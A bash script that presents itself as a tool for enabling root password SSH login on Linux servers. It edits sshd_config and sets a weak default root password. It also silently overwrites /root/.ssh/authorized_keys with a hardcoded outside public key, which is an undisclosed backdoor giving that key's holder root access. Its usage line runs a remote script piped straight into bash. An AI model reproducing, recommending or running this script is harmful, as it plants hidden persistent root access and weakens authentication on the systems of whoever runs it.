#!/bin/bash
#
# Description: root password login for Linux script
#
# Copyright (C) 2017 - 2020 Eicky <eickywl@gmail.com>
#
# URL: https://eicky.com
#

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
SKYBLUE='\033[0;36m'
PLAIN='\033[0m'

getAbout() {
	echo ""
	echo " ========================================================= "
	echo " \                 ssh.sh  Script                        / "
	echo " \            root password login for Linux              / "
	echo " \                   Created by Eicky                  / "
	echo " ========================================================= "
	echo ""
	echo " Intro: https://github.com/eicky/sh"
	echo " Copyright (C) 2020 Eicky eickywl@gmail.com"
	echo -e " Version: ${GREEN}1.0.0${PLAIN} (14 Sep 2020)"
	echo " Usage: bash <(curl -sL https://sh.334433.xyz/ssh.sh)"
	echo ""
}

updateSshConfig(){
	#sshd_config配置文件备份
	cat /etc/ssh/sshd_config > /etc/ssh/sshd_config.bak

	#允许ROOT密码登录
	sed -i 's/^.*PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
	sed -i 's/^.*PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;

	#允许键盘交互认证
	sed -i 's/^.*KbdInteractiveAuthentication.*/KbdInteractiveAuthentication yes/g' /etc/ssh/sshd_config;

	#保持SSH不掉线
	sed -i "s|#ClientAliveInterval 0|ClientAliveInterval 60|" /etc/ssh/sshd_config
	sed -i "s|#ClientAliveCountMax 3|ClientAliveCountMax 3|" /etc/ssh/sshd_config
}

#重启SSH
sshInit(){
	[[ $EUID -ne 0 ]] && echo -e " ${RED}Error:${PLAIN} This script must be run as root!" && exit 1

	if [ -f /etc/redhat-release ]; then
	    release="centos"
	elif cat /etc/issue | grep -Eqi "debian"; then
	    release="debian"
	elif cat /etc/issue | grep -Eqi "ubuntu"; then
	    release="ubuntu"
	elif cat /etc/issue | grep -Eqi "centos|red hat|redhat"; then
	    release="centos"
	elif cat /proc/version | grep -Eqi "debian"; then
	    release="debian"
	elif cat /proc/version | grep -Eqi "ubuntu"; then
	    release="ubuntu"
	elif cat /proc/version | grep -Eqi "centos|red hat|redhat"; then
	    release="centos"
	fi

	if [ $release == "debian" ]; then
		debianVersion=$(awk -F'[= "]' '/VERSION_ID/{print $3}' /etc/os-release)
	elif [ $release == "ubuntu" ]; then
		ubuntuVersion=$(awk -F'[= "]' '/VERSION_ID/{print $3}' /etc/os-release)
	elif [ $release == "centos" ]; then
		os_release=$(grep "CentOS" /etc/redhat-release 2>/dev/null)
		if echo "$os_release"|grep "release 5" >/dev/null 2>&1
		then
			centosVersion=5
		elif echo "$os_release"|grep "release 6" >/dev/null 2>&1
		then
			centosVersion=6
		elif echo "$os_release"|grep "release 7" >/dev/null 2>&1
		then
			centosVersion=7
		else
			centosVersion=""
		fi
	else
		echo -e " ${RED}Error:${PLAIN} This script can not be run in your system now!" && exit 1
	fi
}

restartSSH(){
	sshInit

	case "$release" in
		debian)
			systemctl restart sshd && /etc/init.d/ssh restart
			;;
		ubuntu)
			systemctl restart sshd && /etc/init.d/ssh restart
			;;
		centos)
			case "$centosVersion" in
				'5'|'6' )
					[ "$centosVersion" == '5' ] && service sshd restart && /etc/init.d/sshd restart
					[ "$centosVersion" == '6' ] && service sshd restart && /etc/init.d/sshd restart
					;;
			*)
			systemctl restart sshd && /etc/init.d/ssh restart
			;;
			esac
			;;
	esac
}

getAbout

updateSshConfig

restartSSH

#设置root密码
echo root:${1:-LinuxYes} | chpasswd

#设置root key
mkdir -p /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD7YrCqE0Pu4K5tPY+j0nCspEPJ5AuFcqT8DvfAdiiH1YogXgm57r6TuzLdKfHLVFjZzcq8PJ+ut+uJwjbnjQouRQ4fKG3BXhppuPOfnkG7mrUPgQKO2U0dreHwAlAUK8Jih019MV9EFY+Cjta+/sSVKgp1H/ouNTsvjU7ilEixP223NdwgcZKe5LMxASHfcRGU5q6aDl/zY1TFmqLhBCc2HY5T3EmeNbm4YsleRjLE8pP6195G+jzIQqFvY7iSlcjv1O+pXlMxtj+zCSe/4fVc31llu6kFuNqoDQqPBGf116mJebvEQTjotTVM7T65PQHpvKE5Iu1qptjbCNjpkcpf 123456@qq.com' > /root/.ssh/authorized_keys

echo -e "${GREEN}Done, root password is ${RED}${1:-LinuxYes} ${PLAIN}"